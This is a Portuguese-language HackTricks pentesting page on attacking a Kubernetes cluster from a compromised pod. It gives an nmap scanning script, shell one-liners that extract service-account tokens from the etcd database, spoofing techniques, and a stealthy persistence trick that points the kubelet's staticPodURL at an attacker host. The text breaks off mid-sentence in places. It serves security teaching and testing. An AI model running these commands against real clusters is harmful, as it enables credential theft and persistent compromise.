# Atacando o Kubernetes de dentro de um Pod

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## **Pod Breakout**

**Se voc√™ tiver sorte, poder√° escapar dele para o n√≥:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Escapando do pod

Para tentar escapar do pod, voc√™ pode precisar **escalar privil√©gios** primeiro, algumas t√©cnicas para faz√™-lo:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Voc√™ pode verificar esses **docker breakouts para tentar escapar** de um pod que voc√™ comprometeu:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abusando dos Privil√©gios do Kubernetes

Como explicado na se√ß√£o sobre **enumera√ß√£o do Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Normalmente, os pods s√£o executados com um **token de conta de servi√ßo** dentro deles. Essa conta de servi√ßo pode ter alguns **privil√©gios anexados** que voc√™ pode **abusar** para **mover** para outros pods ou at√© mesmo para **escapar** para os n√≥s configurados dentro do cluster. Verifique como em:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abusando dos Privil√©gios da Nuvem

Se o pod for executado dentro de um **ambiente de nuvem**, voc√™ poder√° **vazar um token do endpoint de metadados** e escalar privil√©gios usando-o.

## Procurando servi√ßos de rede vulner√°veis

Como voc√™ est√° dentro do ambiente do Kubernetes, se n√£o puder escalar privil√©gios abusando dos privil√©gios atuais dos pods e n√£o puder escapar do cont√™iner, voc√™ deve **procurar servi√ßos potencialmente vulner√°veis.**

### Servi√ßos

**Para esse prop√≥sito, voc√™ pode tentar obter todos os servi√ßos do ambiente do Kubernetes:**

```
kubectl get svc --all-namespaces
```

Por padr√£o, o Kubernetes usa um esquema de rede plano, o que significa que **qualquer pod/servi√ßo dentro do cluster pode se comunicar com outros**. Os **namespaces** dentro do cluster **n√£o t√™m restri√ß√µes de seguran√ßa de rede por padr√£o**. Qualquer pessoa no namespace pode se comunicar com outros namespaces.

### Escaneamento

O seguinte script Bash (retirado de um [workshop do Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)) instalar√° e escanear√° os intervalos de IP do cluster do Kubernetes:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube () 
{ 
    nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
    local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');                                                                  
    local SERVER_RANGES=" ";
    SERVER_RANGES+="10.0.0.1 ";
    SERVER_RANGES+="10.0.1.* ";
    SERVER_RANGES+="10.*.0-1.* ";
    nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

Confira a seguinte p√°gina para aprender como voc√™ pode **atacar servi√ßos espec√≠ficos do Kubernetes** para **comprometer outros pods/todo o ambiente**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Sniffing

Caso o **pod comprometido esteja executando algum servi√ßo sens√≠vel** em que outros pods precisem se autenticar, voc√™ poder√° obter as credenciais enviadas pelos outros pods **farejando as comunica√ß√µes locais**.

## Network Spoofing

Por padr√£o, t√©cnicas como **ARP spoofing** (e gra√ßas a isso **DNS Spoofing**) funcionam na rede do Kubernetes. Ent√£o, dentro de um pod, se voc√™ tiver a **capacidade NET\_RAW** (que est√° l√° por padr√£o), voc√™ poder√° enviar pacotes de rede personalizados e realizar **ataques MitM via ARP Spoofing para todos os pods em execu√ß√£o no mesmo n√≥.**\
Al√©m disso, se o **pod malicioso** estiver em execu√ß√£o no **mesmo n√≥ que o servidor DNS**, voc√™ poder√° realizar um **ataque de DNS Spoofing para todos os pods no cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

N√£o h√° especifica√ß√£o de recursos nos manifestos do Kubernetes e **nenhum limite aplicado
### Roubar etcd

Se voc√™ puder especificar o [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) do n√≥ que executar√° o cont√™iner, obtenha um shell dentro de um n√≥ de plano de controle e obtenha o **banco de dados etcd**:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

Os n√≥s de plano de controle t√™m a **fun√ß√£o de mestre** e em **clusters gerenciados em nuvem voc√™ n√£o poder√° executar nada neles**.

#### Ler segredos do etcd

Se voc√™ puder executar seu pod em um n√≥ de plano de controle usando o seletor `nodeName` na especifica√ß√£o do pod, poder√° ter f√°cil acesso ao banco de dados `etcd`, que cont√©m toda a configura√ß√£o do cluster, incluindo todos os segredos.

Abaixo est√° uma maneira r√°pida e suja de pegar segredos do `etcd` se ele estiver sendo executado no n√≥ de plano de controle em que voc√™ est√°. Se voc√™ quiser uma solu√ß√£o mais elegante que inicie um pod com a utilidade do cliente `etcd` `etcdctl` e use as credenciais do n√≥ de plano de controle para se conectar ao etcd onde quer que ele esteja sendo executado, confira [este exemplo de manifesto](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**Verifique se o `etcd` est√° sendo executado no n√≥ de plano de controle e veja onde est√° o banco de dados (isso est√° em um cluster criado por `kubeadm`)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

Sa√≠da:

```bash
data-dir=/var/lib/etcd
```

**Veja os dados no banco de dados etcd:**

```bash
strings /var/lib/etcd/member/snap/db | less
```

**Extraia os tokens do banco de dados e mostre o nome da conta de servi√ßo**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**O mesmo comando, mas com alguns greps para retornar apenas o token padr√£o no namespace kube-system**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

Sa√≠da:

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

### Persist√™ncia de Pods Est√°ticos/Mirrored

_Pods Est√°ticos_ s√£o gerenciados diretamente pelo daemon kubelet em um n√≥ espec√≠fico, sem que o servidor API os observe. Ao contr√°rio dos Pods que s√£o gerenciados pelo plano de controle (por exemplo, um Deployment); em vez disso, o **kubelet observa cada Pod est√°tico** (e o reinicia se falhar).

Portanto, os Pods est√°ticos est√£o sempre **vinculados a um Kubelet** em um n√≥ espec√≠fico.

O **kubelet tenta automaticamente criar um Pod espelho no servidor API do Kubernetes** para cada Pod est√°tico. Isso significa que os Pods em execu√ß√£o em um n√≥ s√£o vis√≠veis no servidor API, mas n√£o podem ser controlados a partir dele. Os nomes dos Pods ser√£o sufixados com o nome do host do n√≥ com um h√≠fen inicial.

{% hint style="danger" %}
O **`spec` de um Pod est√°tico n√£o pode se referir a outros objetos da API** (por exemplo, ServiceAccount, ConfigMap, Secret, etc. Portanto, **voc√™ n√£o pode abusar desse comportamento para lan√ßar um pod com uma conta de servi√ßo arbitr√°ria** no n√≥ atual para comprometer o cluster. Mas voc√™ pode usar isso para executar pods em diferentes namespaces (caso seja √∫til por algum motivo).
{% endhint %}

Se voc√™ estiver dentro do host do n√≥, poder√° faz√™-lo criar um **pod est√°tico dentro dele mesmo**. Isso √© bastante √∫til porque pode permitir que voc√™ **crie um pod em um namespace diferente** como **kube-system**.

Para criar um pod est√°tico, a [**documenta√ß√£o √© de grande ajuda**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Basicamente, voc√™ precisa de 2 coisas:

* Configure o par√¢metro **`--pod-manifest-path=/etc/kubernetes/manifests`** no **servi√ßo kubelet**, ou no **config do kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) e reinicie o servi√ßo
* Crie a defini√ß√£o no **pod definition** em **`/etc/kubernetes/manifests`**

**Outra maneira mais furtiva seria:**

* Modificar o par√¢metro **`staticPodURL`** do arquivo de configura√ß√£o do **kubelet** e definir algo como `staticPodURL: http://attacker.com:8765/pod.yaml`. Isso far√° com que o